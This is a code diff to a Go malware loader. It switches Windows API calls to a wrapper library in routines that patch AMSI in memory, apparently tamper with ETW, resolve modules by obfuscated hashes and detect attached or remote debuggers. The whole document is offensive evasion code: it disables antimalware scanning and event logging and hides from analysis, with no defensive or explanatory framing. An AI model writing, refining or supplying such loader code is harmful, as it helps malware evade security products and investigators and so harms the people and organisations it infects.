@@ -7,18 +7,13 @@ import (
 	"loader/pkg/wrappers"
 	"loader/pkg/types"
 	"loader/pkg/obf"
-	"syscall"
+	api "github.com/carved4/go-wincall"
 	"unsafe"
 	"runtime"
 	"os"
 )
 
-var (
-	mk32 = syscall.NewLazyDLL("kernel32.dll")
-	crdp = mk32.NewProc("CheckRemoteDebuggerPresent")
-	kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
-	isDebugger  = kernel32DLL.NewProc("IsDebuggerPresent")
-)
+// No need for global proc addresses, using high-level api.Call instead
 
 func ETW() {
 	ntdllbase := resolve.GetModuleBase(obf.GetHash("ntdll.dll"))
@@ -80,15 +75,7 @@ func ETW() {
 }
 
 func AMSI() error {
-	var amsiDll *syscall.DLL
-	var err error
-	amsiDll, err = syscall.LoadDLL("amsi.dll")
-	if err != nil {
-		amsiDll = syscall.MustLoadDLL("amsi.dll")
-		defer amsiDll.Release()
-	} else {
-		defer amsiDll.Release()
-	}
+	api.LoadLibraryW("amsi.dll")
 	amsiHash := obf.GetHash("amsi.dll")
 	amsiBase := resolve.GetModuleBase(amsiHash)
 	if amsiBase == 0 {
@@ -126,7 +113,7 @@ func AMSI() error {
 		var oldProtect uint32
 		targetAddr := procAddr
 		
-		_, err = wrappers.NtProtectVirtualMemory(
+		_, err := wrappers.NtProtectVirtualMemory(
 			currentProcess,
 			&targetAddr,
 			&patchSize,
@@ -172,7 +159,10 @@ func CheckDebug() {
 
 // IsDebuggerPresent1 checks if a debugger is present.
 func IsDebuggerPresent1() bool {
-	flag, _, _ := isDebugger.Call()
+	flag, err := api.Call("kernel32.dll", "IsDebuggerPresent")
+	if err != nil {
+		return false
+	}
 	return flag != 0
 }
 
@@ -187,7 +177,7 @@ func IsDebuggerPresent() bool {
 // RemoteDebugger checks for the presence of a remote debugger.
 func RemoteDebugger() (bool) {
 	var isremdebpres bool
-	r1, _, err := crdp.Call(^uintptr(0), uintptr(unsafe.Pointer(&isremdebpres)))
+	r1, err := api.Call("kernel32.dll", "CheckRemoteDebuggerPresent", ^uintptr(0), uintptr(unsafe.Pointer(&isremdebpres)))
 	if r1 == 0 {
 		return false
 	}
